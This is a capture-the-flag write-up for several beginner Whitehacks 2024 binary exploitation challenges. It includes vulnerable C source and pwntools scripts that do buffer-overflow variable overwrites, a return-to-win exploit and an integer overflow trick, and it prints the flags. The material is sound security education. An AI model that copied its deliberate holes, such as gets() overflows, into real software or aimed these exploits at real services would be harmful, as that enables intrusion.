# Binary exploitation challenges in Whitehacks 2024
- [Connect!](#connect)
- [login](#login)
- [endianajones](#endianajones)
- [variedfun!](#variedfun)
- [Beefy Variable](#beefy-variable)
- [secretfunction](#secretfunction)
- [Cost of Living Vouchers](#cost-of-living-vouchers)

-----

## Connect

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/85e90a76-76d8-4fab-b59d-5cb49f10530b)

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/db9905a7-0378-408c-9993-4d67e0017142)

Flag: `WH2024{netcat_is_easy}`

-----

## login

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/00dea840-3fd7-473f-a42f-03fbdde82f99)

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/6cd1b09a-bb94-4e4a-8722-e67b7c7c0f1b)

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define FLAGSIZE 64

void print_flag(){
	char flag[FLAGSIZE];

	FILE *f = fopen("flag.txt","r");
	if (f == NULL) {
		printf("Flag File is Missing.\n");
		exit(0);
	}

	fgets(flag,FLAGSIZE,f);
	printf(flag);
}

int main(int argc, char** argv) {
	setvbuf(stdout, NULL, _IONBF, 0);

	char buffer[32] = {0x00};

	printf("%s", "Login: ");
	fgets(buffer, sizeof(buffer), stdin);

	if (strcmp(buffer, "Weje\n") == 0){
		printf("%s", "Password: ");
		fgets(buffer, sizeof(buffer), stdin);

		if (strcmp(buffer, "P@SSW0RD\n") == 0){
			printf("%s\n", "Login passed! Here is your flag.");
			print_flag();
		} else {
			printf("%s\n", "Invalid password!");
		}
	} else {
		printf("%s\n", "Invalid Username.");
	}

}
```

Shows the 2 passwords we need to input: `Weje` and `P@SSW0RD`

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/da68c2da-e4fd-4584-977c-5332bb6fa004)

Flag: `WH2024{L0g1n_successf00l}`

-----

## endianajones

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/4d158c8d-ff6f-4b69-8ffb-ebea67621761)

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/d31cc1e6-6485-4ac1-9640-ca07537359b9)

Used [CyberChef](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,true)&input=MHhmZmViMGE1Zg) to swap endianess

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/ac661776-7629-472b-b3c4-0f2663396181)

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/b0caa41d-2cf2-4185-bb68-d1c0cceb0019)

Flag: `WH2024{D0nt_c4ll_m3_litt1e}`

-----

## variedfun

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/c4811549-562d-4bfb-9b26-2c8729fab57f)

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/10acd379-7612-49cd-a71a-05da4dbc37bc)

```c
#include <stdio.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

#define FLAGSIZE 64

char flag[FLAGSIZE];

void win(){
	FILE *f = fopen("flag.txt","r");
	if (f == NULL) {
		printf("Flag File is Missing.\n");
		exit(0);
	}

	fgets(flag,FLAGSIZE,f);
	printf(flag);

	return;
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0); // clears standard output, you don't need to know this 

	volatile int target; // this guy here is one you want to change
	char buffer[64] = {0x00}; // this guy here can fit 64 characters

	target = 0;
	
	printf("Target is currently set to %d, overflow buffer and change 'target'!\n", target);
	printf("Gimme input: ");
	gets(buffer); // gets is an insecure function that allows you to input as many characters as you want to buffer.

	if (target != 0) {
		printf("You have changed the 'target' variable!\n");
		win();
	} else {
		printf("Nope, target is still %d\n", target);
	}
}
```

Simple variable overwrite:

```py
from pwn import *

context.log_level = 'error'

r = remote('ctf.whitehats.site', 14004)

payload = b'A' * 64 + b'\x01\x00\x00\x00'
r.sendline(payload)

r.interactive()
```

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/26e1ccea-6085-4558-8e06-ca1eeb0f29ca)

Flag: `WH2024{Im_1337_hakkerman_lmao}`

-----

## Beefy-Variable

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/2df381b2-98eb-4e9e-abb7-2df817a971a6)

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/dc7b2727-a7e4-4e75-8676-79c48763af26)

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define FLAGSIZE 64

char flag[FLAGSIZE];

void win(){
	FILE *f = fopen("flag.txt","r");
	if (f == NULL) {
		printf("Flag File is Missing.\n");
		exit(0);
	}

	fgets(flag,FLAGSIZE,f);
	printf(flag);

	return;
}


void vulnerable() {
	volatile long val = 0x12345678;
	char buf[64] = {0x00};

	printf("The flag can only be touched when val is altered, you can never figure it out!\n");
	fgets(buf, 69, stdin);
	
	printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

	if (val == 0xdeadbeef)
		win();
	else {
		printf("Nope.");
		exit(1);
	}
	return;	
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);
	vulnerable();
	return 0;
}
```

Another simple variable overwrite:

```py
from pwn import *

context.log_level = 'error'

r = remote('ctf.whitehats.site', 14005)

r.sendline(b'A'*64 + p32(0xdeadbeef))

r.interactive()
```

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/2dc68ca4-5c1a-4d19-af4c-f9ab37561405)

Flag: `WH2024{H0w_d1d_you_f1gur3_i+_0ut!?}`

-----

## secretfunction

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/5fa7eb53-56f4-499e-bc94-c316c9279bb1)

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/2dcbf874-32c7-4d8a-8589-dab822e03aef)

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define FLAGSIZE 64

char flag[FLAGSIZE];

void secret(){
	FILE *f = fopen("flag.txt","r");
	if (f == NULL) {
		printf("Flag File is Missing.\n");
		exit(0);
	}

	fgets(flag,FLAGSIZE,f);
	printf("%s\n", flag);
}


void vulnerable() {
	char buf[64] = {0x00};
	
	gets(buf);
	puts("Maybe you will find it next time");
	return;	
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);
	puts("Hidden in me is a function that leads you to the flag, can you find it?");
	vulnerable();
}
```

Use ropper to get address of `ret` and address of `win`, played around with offset to get correct offset. Since somethings wrong with the server the flag only shows 6% of the time so it is in a while loop.

```py
from pwn import *

context.log_level = 'error'

offset = 68
ret = 0x0804900a
win = 0x080491b2
while 1:
	r = remote('ctf2.whitehats.site', 2008)

	payload = b'A' * offset + p32(win) + p32(ret)

	r.sendline(payload)
	r.recvuntil(b'Maybe you will find it next time\n')

	try:
		a = r.recvline().decode()
		if 'WH2024' in a:
			print(a)
			break
	except:
		pass
```

Flag: `WH2024{1m_h1dd3n_in_s3cret}`

-----

## Cost-of-Living-Vouchers

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/3239b8eb-be3a-408f-b81d-66e74d4a9809)

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/25c0a39f-926a-4e15-aaca-2308c87add40)

Shows a menu with choices to use money and check money. Realised it is possibly integer overflow.

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/1ba099ca-eb62-44f1-bdd8-c19018576ed6)

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/3872f2e3-cc02-41b1-808c-875d3cd66c67)

Cannot buy the flag, need more money. I try to play around with what I can withdraw.

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/e576344e-884c-467e-805e-debdf414591d)

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/28d0c8a6-b86e-4619-875d-d9a37eed20ff)

Looks like I got something using a number bigger than INTMAX.

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/0d267b88-717a-41bb-8cb7-03713731a8ca)

Let me try buy a flag with this.

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/9d8164f4-3e63-4748-a562-1bd5f3d543fa)

Still does not work.

I restarted it and used INTMAX + 10000 to withdraw:

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/486fc52f-6fa1-4a50-a766-0c358f0c284c)

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/758ff647-3a0f-44bc-9c8a-02ce2c4cda00)

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/91bb7c92-362d-4be8-96ad-5e1fcd64527d)

Flag: `WH2024{st0nk1ng_w17H_v0uch3r_0verfl0wS}`
